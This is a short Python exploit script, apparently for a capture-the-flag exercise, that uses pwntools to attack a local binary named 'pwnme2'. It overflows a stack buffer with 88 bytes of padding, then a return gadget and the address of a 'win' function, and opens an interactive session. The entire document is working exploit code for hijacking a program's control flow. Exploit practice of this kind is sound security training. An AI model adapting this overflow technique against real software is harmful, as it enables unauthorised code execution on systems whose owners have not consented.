from pwn import *

p = process('./pwnme2')

ret_gadget = p64(0x4011d7) 
win        = p64(0x401176)

payload = b'A' * 88 + ret_gadget + win

p.sendline(payload)
p.interactive()
